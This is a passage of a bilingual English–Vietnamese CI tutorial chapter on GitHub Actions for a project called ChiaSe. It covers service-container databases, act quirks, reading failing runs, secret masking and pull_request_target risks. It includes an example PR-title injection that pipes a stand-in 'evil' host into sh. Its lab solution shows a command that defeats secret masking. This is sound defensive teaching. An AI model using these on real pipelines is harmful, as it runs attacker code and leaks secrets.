<p>In act, <code>job.services</code> is <code>null</code>, so the URL became <code>localhost:/chiase</code>, the driver used the default port 5432, and act's job container uses the <em>host</em> network: the tests knocked on <strong>somebody else's database on the same machine</strong>. It refused the password, so no harm. With a matching password, the integration tests — which <code>TRUNCATE</code> every table between tests — would have wiped it. The final file uses a fixed, unusual host port (<code>41855:5432</code>) that works on both GitHub and act. The lesson is bigger than act: <strong>a test database URL must never be able to fall back to something real</strong>. Our <code>test/moi-truong.ts</code> already points unit tests at port 1 for exactly this reason (lesson 8.1).</p>

<div class="pitfall co-tieu-de"><p><strong>Pitfall — "act is green" is not "GitHub is green".</strong> Measured differences in this chapter: job containers on the host network, <code>job.services</code> missing, matrix jobs started in parallel even with <code>--concurrent-jobs 1</code>, branch protection does not exist. Use act to iterate fast on a workflow; trust the run on GitHub.</p></div>

<h3>5. Green</h3>
<div class="out">${XANH}</div>
<p>78 seconds wall-clock for the whole run: the two jobs ran side by side, <code>npm test</code> took 26.9 s of which 3.7 s was <code>prisma migrate deploy</code> into the service database. Node is v22.23.2 because <code>node-version-file: .nvmrc</code> reads <code>22</code> — the same major as the Docker image (lesson 9.1), so CI tests what production runs.</p>

<h3>6. Red, twice — and what the PR shows</h3>
<p>On a throw-away copy of the repo, one wrong type:</p>
<div class="out">${DO_KIEU}</div>
<p>Then the IDOR mutation from Checkpoint 8 — <code>where: { id }</code> instead of <code>where: { id, authorId }</code> when editing a post:</p>
<div class="out">${DO_TEST}</div>
<p>Look at the <code>::error file=…,line=57,column=8::</code> lines. Vitest prints them by itself when it sees <code>GITHUB_ACTIONS=true</code>; GitHub turns them into <strong>annotations</strong>: a red box on line 57 of <code>bao-ve.api.test.ts</code> right in the PR's "Files changed" tab. The reviewer does not have to open the log to see which promise broke.</p>

<h3>7. Reading a red run, top to bottom</h3>
<p>Annotations tell you <em>where</em>; the log tells you <em>why</em>. Here is the whole <code>npm test</code> step of the IDOR run (annotation lines removed, they repeat what follows):</p>
<div class="out">${DO_DAY}</div>
<p>Read it in this order, and stop as soon as you know enough: (1) the <strong>summary</strong> at the bottom — 2 failed of 106, one file; (2) the <strong>first <code>FAIL</code> block</strong> — the test name is a sentence ("Bình edits/deletes An's post ⇒ 403, post NOT changed in the DB"), which is why lesson 8.3 insisted on naming tests as promises; (3) the <strong>assertion</strong> — expected 403, got 200: the server <em>allowed</em> it; (4) the <strong>first stack frame in your code</strong> (<code>bao-ve.api.test.ts:57</code>), ignoring the supertest internals below it. Everything above the first <code>FAIL</code> is noise for this question. The second failure (draft post visible to Bình) is the same bug seen from another angle — one cause, two symptoms, so fix once and rerun before touching anything else.</p>

<div class="pitfall co-tieu-de"><p><strong>Hacker's corner — secrets in CI logs.</strong> GitHub replaces a secret's value with <code>***</code> in logs. Here is what that protects, run with a fake secret:</p>
<pre><code class="language-yaml">${BI_MAT}</code></pre>
<div class="out">${LO}</div>
<p>Masking is a <em>search and replace of the exact stored string</em>. Base64, reversed, or split in two, the value is printed in clear. This is not theory: in <strong>March 2025 the tj-actions/changed-files action was compromised</strong> (GHSA-mrrh-fwg8-r2c3, CVE-2025-30066, over 23,000 repositories). The attacker moved existing version tags to a malicious commit; the new code dumped the runner's memory, <strong>base64-encoded the secrets and printed them into the build log</strong> — public for public repositories — between 14 and 15 March. Repositories pinned to a commit hash were not affected. Defences: pin to full SHAs (done), least-privilege <code>permissions</code> (done), never put structured data (a JSON blob) in one secret because masking needs an exact match, and if a secret ever reaches a log, <em>rotate it</em> — deleting the log is not enough.</p></div>

<div class="pitfall co-tieu-de"><p><strong>Hacker's corner — <code>pull_request_target</code>.</strong> It runs in the context of the <em>target</em> repo: write token and secrets, even for a PR from a stranger's fork. GitHub Security Lab calls the combination "<code>pull_request_target</code> + checkout of the PR's code" a <em>pwn request</em>: the attacker's <code>package.json</code> scripts run with your secrets. In <strong>December 2024 Ultralytics</strong> (the YOLO library) was hit through its CI: the PyPI post-mortem names <code>pull_request_target</code> and a poisoned GitHub Actions cache; malicious versions 8.3.41, 8.3.42, 8.3.45 and 8.3.46 were published to PyPI straight from the poisoned pipeline. Rules for ChiaSe: only <code>pull_request</code>; never interpolate <code>\${{ github.event.pull_request.title }}</code> (or body, branch name) directly into <code>run:</code> — a title like <code>"; curl evil | sh; "</code> becomes a command; pass it through <code>env:</code> instead.</p></div>

${spring(true, 'Same two jobs: actions/setup-java with cache: maven, then mvn -B verify. Testcontainers works on GitHub-hosted runners because Docker is installed there, so a Spring project often skips the service container.', [
  ['sb-17-3-github-actions-spring', 'Spring Boot 17.3 — CI with GitHub Actions'],
])}

<h3>Everyday analogy</h3>
<p>A restaurant pass: every plate goes through the same counter where the head chef checks it before it reaches a customer, however busy the night and however senior the cook. CI is that counter. It does not cook better than you; it just never skips the check.</p>

<h3>On the job</h3>
<p>On your first OJT week your PR goes red. Do not push "fix ci" five times. Open the run, find the <em>first</em> failing step, copy its command, and run it locally from a clean state (<code>git stash -u; npm ci; npm run check</code>). If it is green locally and red in CI, the difference is the environment — a version, a missing env var, a port, a timezone — which is exactly what CI exists to catch.</p>

<h3>🎤 Interviewers will ask</h3>
<ol>
<li><strong>"npm ci or npm install in CI?"</strong> — <code>npm ci</code>: exact lockfile, clean <code>node_modules</code>, fails on mismatch.</li>
<li><strong>"How does your CI test against a database?"</strong> — A service container (real Postgres 18) with a health check; the test URL comes from the workflow and cannot fall back to a real database.</li>
<li><strong>"How do you keep secrets safe in CI?"</strong> — Least-privilege token, pinned actions, secrets only through <code>env:</code>, never echoed; masking is exact-match only, so leaked ⇒ rotate.</li>
<li><strong>"pull_request vs pull_request_target?"</strong> — The first runs untrusted code without secrets; the second has secrets and must never check out and run the PR's code.</li>
<li><strong>"Why pin actions to a SHA?"</strong> — Tags move (tj-actions 2025); a commit hash does not.</li>
</ol>

<h3>🧪 Lab 10.1</h3>
<div class="callout ok">
<ol>
<li>Write <code>.github/workflows/ci.yml</code> with the two jobs. Check it with <code>actionlint</code> (<code>docker run --rm -v "$PWD:/repo" -w /repo rhysd/actionlint</code>).</li>
<li>Run it: on GitHub (push to your own repo) or with act (<code>act push -P ubuntu-latest=catthehacker/ubuntu:act-24.04</code>). Note the time of the first run and of the second.</li>
<li>Reproduce failure 3 on purpose: give <code>TEST_DATABASE_URL</code> a host that does not exist. What does the error say, and how long does it take to fail?</li>
<li>Make each job red once (a type error, a broken assertion) on a branch and read the annotations.</li>
<li>Run the secret workflow with a fake value and find a fourth way to leak it.</li>
</ol>
<p><strong>Done when:</strong> both jobs are green on a clean checkout, each can be made red by one realistic change, your workflow has no <code>pull_request_target</code>, every <code>uses:</code> is a 40-character SHA, and every job has a timeout.</p>
</div>
<details><summary>Solution</summary>
<p>The file is printed in section 2. Step 3: a non-existent host fails fast (DNS error) — much better than a real one. Step 5: e.g. <code>echo "$K" | sed 's/./&amp; /g'</code> (spaces between characters), or writing it into an artifact.</p>
</details>

<div class="kv-grid">
  <div class="kv"><span class="k">runner</span><span class="v">The fresh machine that runs one job.</span></div>
  <div class="kv"><span class="k">service container</span><span class="v">A container (Postgres) started next to a job, health-checked first.</span></div>
  <div class="kv"><span class="k">GITHUB_TOKEN</span><span class="v">Per-run token; its rights come from <code>permissions:</code>.</span></div>
  <div class="kv"><span class="k">annotation</span><span class="v">A <code>::error file=…,line=…</code> line shown on the PR's diff.</span></div>
  <div class="kv"><span class="k">masking</span><span class="v">Exact-string replacement of secrets by ***.</span></div>
  <div class="kv"><span class="k">act</span><span class="v">Runs GitHub Actions workflows locally in Docker; close, not identical.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
<li>CI runs the same check + test on a fresh machine for every push and PR.</li>
<li>Least privilege, pinned SHAs, no persisted credentials, timeouts, concurrency.</li>
<li>Real Postgres as a service container; the test URL must not be able to hit a real database.</li>
<li>act is great for iterating, but differs from GitHub in measurable ways.</li>
<li>Masking only hides the exact string; pull_request_target + PR code = pwn request.</li>
</ul>
${NGUON}
${THE}
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 10 · CI</span>
<h2>Một con robot chạy checklist của bạn sau mỗi lần push</h2>
<p class="lead">Checklist thì bạn có rồi: <code>npm run check</code> (lint, kiểu, định dạng) và <code>npm test</code> (106 test trên Postgres thật). Vấn đề là con người hay bỏ qua — "sửa có một dòng thôi mà". Tích hợp liên tục (CI) là một cỗ máy chạy đúng những lệnh đó trên một máy <em>mới tinh</em> cho mỗi lần push và mỗi pull request, rồi ghi kết quả ngay cạnh commit, chỗ không ai lờ đi được. Bài này viết cỗ máy đó cho ChiaSe và chạy nó thật.</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">1</span><span class="lz-t">sự kiện</span><span class="lz-d">push lên main, hoặc bất kỳ pull request nào</span></div>
<div class="lz-step"><span class="lz-k">2</span><span class="lz-t">runner mới</span><span class="lz-d">mỗi job một máy ảo Ubuntu mới: không node_modules, không .env, không cache bạn không xin</span></div>
<div class="lz-step"><span class="lz-k">3</span><span class="lz-t">check ∥ test</span><span class="lz-d">hai job song song; test có Postgres riêng dạng service</span></div>
<div class="lz-step"><span class="lz-k">4</span><span class="lz-t">trạng thái</span><span class="lz-d">✅/❌ trên commit và PR; annotation ngay dòng hỏng</span></div>
</div>

<h3>1. Output trong chương này đến từ đâu</h3>
<p>Mọi log dưới đây do <strong>act 0.2.98</strong> (nektos/act) tạo ra trên máy của khoá: act đọc <code>.github/workflows/*.yml</code> và chạy từng job trong một container Docker bắt chước runner Ubuntu của GitHub (ảnh <code>catthehacker/ubuntu:act-24.04</code>). Không có gì được đẩy lên GitHub. Cố ý như vậy — bạn chạy được CI trước cả khi có repo GitHub — nhưng act <em>không phải</em> GitHub, và mục 4 chỉ ra ba chỗ nó khác. Trên GitHub thật thì các bước là: tạo repo trống, <code>git remote add origin git@github.com:&lt;bạn&gt;/chiase.git</code>, <code>git push -u origin main</code>, rồi mở tab <em>Actions</em>; workflow tự chạy vì tệp nằm trong <code>.github/workflows/</code>.</p>

<h3>2. Workflow</h3>
<pre><code class="language-yaml">${CI_DAU}</code></pre>
<p>Đọc từ trên xuống, mỗi dòng là một quyết định:</p>
<ul>
<li><strong><code>on:</code></strong> — <code>push</code> chỉ cho <code>main</code> (nhánh tính năng đã có PR lo, không cần chạy hai lần), và <code>pull_request</code> cho mọi PR. <code>pull_request</code> chạy mã của PR với token <em>chỉ đọc</em> và, nếu PR từ fork, <em>không có secret</em>. Người anh em nguy hiểm của nó là <code>pull_request_target</code> — xem góc hacker bên dưới.</li>
<li><strong><code>permissions: contents: read</code></strong> — <code>GITHUB_TOKEN</code> tự cấp cho mỗi lượt chạy chỉ đọc được mã. Một bước bị chiếm cũng không push, không tạo release, không ghi package được. Bài 10.2 cấp <code>packages: write</code> cho đúng một job.</li>
<li><strong><code>concurrency</code></strong> — ba lần push vào cùng một PR trong một phút ⇒ hai lượt đầu bị huỷ. Trên <code>main</code> thì không: mỗi commit ở đó phải giữ kết quả riêng.</li>
<li><strong><code>timeout-minutes</code></strong> — mặc định là 360. Một test chờ CSDL mãi mãi đốt sáu giờ runner trước khi có ai để ý.</li>
<li><strong>Ghim action</strong> — <code>actions/checkout@3d3c42e…</code> thay cho <code>@v7</code>. Tag là con trỏ mà chủ action (hoặc kẻ cướp được token của họ) dời đi được; mã commit 40 ký tự thì không dời được.</li>
<li><strong><code>persist-credentials: false</code></strong> — mặc định checkout ghi token vào <code>.git/config</code>, mọi bước sau đọc được, kể cả script cài đặt của <code>npm ci</code>.</li>
<li><strong><code>services: postgres</code></strong> — một <code>postgres:18-alpine</code> thật đứng cạnh job, có health check: runner chờ nó healthy rồi mới chạy bước đầu tiên. <code>TEST_DATABASE_URL</code> báo cho <code>globalSetup</code> (bài 8.2) dùng nó thay vì tự bật container Docker.</li>
</ul>

<h3>3. Vì sao <code>npm ci</code>, và <code>cache: npm</code> thật ra cache cái gì</h3>
<p><code>npm ci</code> cài <em>đúng y</em> lockfile, xoá <code>node_modules</code> trước và báo lỗi nếu <code>package.json</code> lệch lockfile — đúng tính tái lập CI cần (<code>npm install</code> có thể lặng lẽ cập nhật lockfile). <code>cache: npm</code> cache <code>~/.npm</code> — kho tải về của npm, khoá theo băm của <code>package-lock.json</code> — chứ không cache <code>node_modules</code>. Đo được: lượt đầu lưu cache 169 MB; có cache, <code>npm ci</code> từ 24,8 s xuống 16–20 s. Phần còn lại là giải nén 424 gói và <code>postinstall</code> (<code>prisma generate</code>) — không cache tải về nào bỏ qua được. Mạng chậm thì lợi nhiều hơn; trên cáp quang của máy này thì vừa phải — đo trước khi hứa tăng tốc.</p>

<h3>4. Những lượt đầu: ba lỗi, một lỗi nguy hiểm</h3>
<p><strong>Lỗi 1 — cổng.</strong> Bản đầu có <code>ports: [5432:5432]</code>, chép từ mọi tutorial:</p>
<div class="out">${CONG}</div>
<p>Máy của khoá đã có một Postgres khác chạy ở 5432. Trên runner GitHub (máy ảo mới) 5432 luôn trống; trên runner tự dựng hay với act thì không. Cách sửa "sách giáo khoa" là cổng ngẫu nhiên trên máy (<code>ports: [5432]</code>) cộng <code>\${{ job.services.postgres.ports['5432'] }}</code>.</p>
<p><strong>Lỗi 2 — sai cấp ngữ cảnh.</strong> Đặt biểu thức đó trong <code>jobs.test.env</code> bị từ chối trước khi kịp chạy gì: <code>Unknown Variable Access job</code>. Ngữ cảnh <code>job</code> không tồn tại ở cấp job; nó tồn tại ở cấp <em>bước</em>. act kiểm đúng cái GitHub cũng sẽ từ chối.</p>
<p><strong>Lỗi 3 — lỗi nguy hiểm.</strong> Chuyển xuống cấp bước, lượt chạy tới được phần test và hỏng thế này:</p>
<div class="out">${NHAM}</div>
<p>"Denied access" nghĩa là <em>có cái gì đó trả lời</em> — nhưng service của ta đâu còn ở 5432. Để biết, một workflow dò hai bước:</p>
<pre><code class="language-yaml">${DV}</code></pre>
<div class="out">${JOB_SV}</div>
<p>Trong act, <code>job.services</code> là <code>null</code>, nên URL thành <code>localhost:/chiase</code>, driver dùng cổng mặc định 5432, mà container job của act lại dùng mạng của <em>máy chủ</em>: test đã gõ cửa <strong>CSDL của người khác trên cùng máy</strong>. Nó từ chối mật khẩu nên không sao. Nếu mật khẩu trùng, test tích hợp — thứ <code>TRUNCATE</code> mọi bảng giữa các test — đã xoá sạch nó. Bản cuối dùng một cổng máy cố định, ít gặp (<code>41855:5432</code>), chạy được cả trên GitHub lẫn act. Bài học lớn hơn chuyện act: <strong>URL CSDL test không bao giờ được phép "rơi về" một thứ có thật</strong>. <code>test/moi-truong.ts</code> của ta đã trỏ unit test vào cổng 1 vì đúng lý do này (bài 8.1).</p>

<div class="pitfall co-tieu-de"><p><strong>Bẫy — "act xanh" chưa phải "GitHub xanh".</strong> Khác biệt đo được trong chương này: container job dùng mạng máy chủ, thiếu <code>job.services</code>, job matrix vẫn chạy song song dù <code>--concurrent-jobs 1</code>, không có branch protection. Dùng act để sửa workflow cho nhanh; tin lượt chạy trên GitHub.</p></div>

<h3>5. Xanh</h3>
<div class="out">${XANH}</div>
<p>78 giây cho cả lượt: hai job chạy cạnh nhau, <code>npm test</code> mất 26,9 s, trong đó 3,7 s là <code>prisma migrate deploy</code> vào CSDL của service. Node là v22.23.2 vì <code>node-version-file: .nvmrc</code> đọc ra <code>22</code> — cùng bản lớn với ảnh Docker (bài 9.1), nên CI test đúng thứ production chạy.</p>

<h3>6. Đỏ, hai lần — và PR hiện gì</h3>
<p>Trên một bản sao vứt đi của repo, một kiểu sai:</p>
<div class="out">${DO_KIEU}</div>
<p>Rồi đột biến IDOR của Checkpoint 8 — <code>where: { id }</code> thay cho <code>where: { id, authorId }</code> khi sửa bài:</p>
<div class="out">${DO_TEST}</div>
<p>Nhìn các dòng <code>::error file=…,line=57,column=8::</code>. Vitest tự in chúng khi thấy <code>GITHUB_ACTIONS=true</code>; GitHub biến chúng thành <strong>annotation</strong>: một ô đỏ ngay dòng 57 của <code>bao-ve.api.test.ts</code> trong tab "Files changed" của PR. Người review không cần mở log cũng thấy lời hứa nào vừa vỡ.</p>

<h3>7. Đọc một lượt đỏ từ trên xuống</h3>
<p>Annotation cho biết <em>ở đâu</em>; log cho biết <em>vì sao</em>. Đây là toàn bộ bước <code>npm test</code> của lượt IDOR (bỏ các dòng annotation vì chúng lặp lại phần dưới):</p>
<div class="out">${DO_DAY}</div>
<p>Đọc theo thứ tự này, đủ hiểu thì dừng: (1) <strong>dòng tổng</strong> ở cuối — 2 hỏng trên 106, một tệp; (2) <strong>khối <code>FAIL</code> đầu tiên</strong> — tên test là một câu ("Bình sửa/xoá bài của An ⇒ 403, bài KHÔNG đổi trong CSDL"), đó là lý do bài 8.3 đòi đặt tên test như một lời hứa; (3) <strong>khẳng định</strong> — chờ 403, nhận 200: máy chủ đã <em>cho phép</em>; (4) <strong>khung stack đầu tiên nằm trong mã của bạn</strong> (<code>bao-ve.api.test.ts:57</code>), bỏ qua phần ruột supertest phía dưới. Mọi thứ phía trên khối <code>FAIL</code> đầu tiên là nhiễu với câu hỏi này. Lỗi thứ hai (Bình xem được bài nháp) là cùng một lỗi nhìn từ góc khác — một nguyên nhân, hai triệu chứng, nên sửa một lần rồi chạy lại trước khi đụng vào thứ khác.</p>

<div class="pitfall co-tieu-de"><p><strong>Góc hacker — bí mật trong log CI.</strong> GitHub thay giá trị secret bằng <code>***</code> trong log. Đây là thứ nó bảo vệ được, chạy với một secret giả:</p>
<pre><code class="language-yaml">${BI_MAT}</code></pre>
<div class="out">${LO}</div>
<p>Che bí mật là <em>tìm-và-thay đúng chuỗi đã lưu</em>. Đổi sang base64, đảo ngược, hay cắt đôi, giá trị hiện rõ. Không phải lý thuyết: <strong>tháng 3/2025 action tj-actions/changed-files bị chiếm</strong> (GHSA-mrrh-fwg8-r2c3, CVE-2025-30066, hơn 23.000 repo). Kẻ tấn công dời các tag phiên bản cũ sang một commit độc; mã mới đọc bộ nhớ của runner, <strong>mã hoá base64 các secret rồi in vào log build</strong> — công khai với repo công khai — trong khoảng 14–15/03. Repo ghim theo mã commit không bị ảnh hưởng. Cách phòng: ghim SHA đầy đủ (đã làm), <code>permissions</code> tối thiểu (đã làm), không nhét dữ liệu có cấu trúc (một khối JSON) vào một secret vì che bí mật cần khớp chính xác, và secret nào đã lọt vào log thì <em>xoay khoá mới</em> — xoá log là chưa đủ.</p></div>

<div class="pitfall co-tieu-de"><p><strong>Góc hacker — <code>pull_request_target</code>.</strong> Nó chạy trong ngữ cảnh của repo <em>đích</em>: token ghi được và có secret, kể cả với PR từ fork của người lạ. GitHub Security Lab gọi tổ hợp "<code>pull_request_target</code> + checkout mã của PR" là <em>pwn request</em>: script trong <code>package.json</code> của kẻ tấn công chạy với secret của bạn. <strong>Tháng 12/2024, Ultralytics</strong> (thư viện YOLO) bị tấn công qua CI: bài phân tích của PyPI chỉ đích danh <code>pull_request_target</code> và một cache GitHub Actions bị đầu độc; các bản 8.3.41, 8.3.42, 8.3.45, 8.3.46 chứa mã độc đã được phát hành lên PyPI ngay từ pipeline bị đầu độc đó. Luật cho ChiaSe: chỉ dùng <code>pull_request</code>; không bao giờ chèn thẳng <code>\${{ github.event.pull_request.title }}</code> (hay body, tên nhánh) vào <code>run:</code> — một tiêu đề như <code>"; curl evil | sh; "</code> sẽ thành lệnh; hãy đưa qua <code>env:</code>.</p></div>

${spring(false, 'Vẫn hai job: actions/setup-java với cache: maven, rồi mvn -B verify. Testcontainers chạy được trên runner GitHub vì ở đó có sẵn Docker, nên dự án Spring hay bỏ qua service container.', [
  ['sb-17-3-github-actions-spring', 'Spring Boot 17.3 — CI với GitHub Actions'],
])}

<h3>Liên hệ đời thường</h3>
<p>Quầy ra món của nhà hàng: đĩa nào cũng đi qua đúng một quầy, bếp trưởng nhìn qua trước khi tới tay khách, dù tối đông cỡ nào và dù đầu bếp thâm niên cỡ nào. CI là cái quầy đó. Nó không nấu ngon hơn bạn; nó chỉ không bao giờ bỏ qua bước kiểm.</p>

<h3>Tình huống đi làm thật</h3>
<p>Tuần đầu OJT, PR của bạn đỏ. Đừng push "fix ci" năm lần. Mở lượt chạy, tìm bước hỏng <em>đầu tiên</em>, chép lệnh của nó, chạy lại ở máy từ trạng thái sạch (<code>git stash -u; npm ci; npm run check</code>). Máy xanh mà CI đỏ thì khác biệt nằm ở môi trường — một phiên bản, một biến môi trường thiếu, một cổng, một múi giờ — đúng thứ CI sinh ra để bắt.</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
<li><strong>"Trên CI dùng npm ci hay npm install?"</strong> — <code>npm ci</code>: đúng lockfile, <code>node_modules</code> sạch, lệch là báo lỗi.</li>
<li><strong>"CI của bạn test với CSDL thế nào?"</strong> — Service container (Postgres 18 thật) có health check; URL test do workflow cấp và không thể rơi về một CSDL thật.</li>
<li><strong>"Giữ secret an toàn trên CI thế nào?"</strong> — Token quyền tối thiểu, ghim action, secret chỉ qua <code>env:</code>, không in ra; che bí mật chỉ khớp chính xác, lọt là xoay khoá.</li>
<li><strong>"pull_request khác pull_request_target chỗ nào?"</strong> — Cái đầu chạy mã không tin cậy mà không có secret; cái sau có secret và không bao giờ được checkout rồi chạy mã của PR.</li>
<li><strong>"Vì sao ghim action theo SHA?"</strong> — Tag dời được (tj-actions 2025); mã commit thì không.</li>
</ol>

<h3>🧪 Lab 10.1</h3>
<div class="callout ok">
<ol>
<li>Viết <code>.github/workflows/ci.yml</code> với hai job. Kiểm bằng <code>actionlint</code> (<code>docker run --rm -v "$PWD:/repo" -w /repo rhysd/actionlint</code>).</li>
<li>Chạy nó: trên GitHub (push lên repo của bạn) hoặc bằng act (<code>act push -P ubuntu-latest=catthehacker/ubuntu:act-24.04</code>). Ghi thời gian lượt đầu và lượt thứ hai.</li>
<li>Cố tình tái hiện lỗi 3: cho <code>TEST_DATABASE_URL</code> một máy không tồn tại. Lỗi báo gì, và mất bao lâu mới hỏng?</li>
<li>Làm mỗi job đỏ một lần (một lỗi kiểu, một khẳng định sai) trên một nhánh và đọc annotation.</li>
<li>Chạy workflow bí mật với một giá trị giả và tìm cách lách thứ tư.</li>
</ol>
<p><strong>Xong khi:</strong> cả hai job xanh trên một bản checkout sạch, mỗi job làm đỏ được bằng một thay đổi thực tế, workflow không có <code>pull_request_target</code>, mọi <code>uses:</code> là SHA 40 ký tự, và job nào cũng có timeout.</p>
</div>
<details><summary>Lời giải</summary>
<p>Tệp in ở mục 2. Bước 3: máy không tồn tại hỏng nhanh (lỗi DNS) — tốt hơn nhiều so với một máy có thật. Bước 5: ví dụ <code>echo "$K" | sed 's/./&amp; /g'</code> (chèn dấu cách giữa các ký tự), hoặc ghi nó vào một artifact.</p>
</details>

<div class="kv-grid">
  <div class="kv"><span class="k">runner</span><span class="v">Cỗ máy mới tinh chạy một job.</span></div>
  <div class="kv"><span class="k">service container</span><span class="v">Container (Postgres) bật cạnh job, kiểm healthy trước.</span></div>
  <div class="kv"><span class="k">GITHUB_TOKEN</span><span class="v">Token của từng lượt chạy; quyền lấy từ <code>permissions:</code>.</span></div>
  <div class="kv"><span class="k">annotation</span><span class="v">Dòng <code>::error file=…,line=…</code> hiện trên diff của PR.</span></div>
  <div class="kv"><span class="k">che bí mật</span><span class="v">Thay đúng chuỗi secret bằng ***.</span></div>
  <div class="kv"><span class="k">act</span><span class="v">Chạy workflow GitHub Actions ở máy bằng Docker; gần giống, không y hệt.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
<li>CI chạy cùng check + test trên máy mới cho mỗi push và PR.</li>
<li>Quyền tối thiểu, ghim SHA, không lưu token, có timeout, có concurrency.</li>
<li>Postgres thật dạng service; URL test không được phép đụng CSDL thật.</li>
<li>act rất tốt để sửa nhanh, nhưng khác GitHub ở những chỗ đo được.</li>
<li>Che bí mật chỉ giấu đúng chuỗi; pull_request_target + mã của PR = pwn request.</li>
</ul>
${NGUON}
${THE}
</div>
`,
};
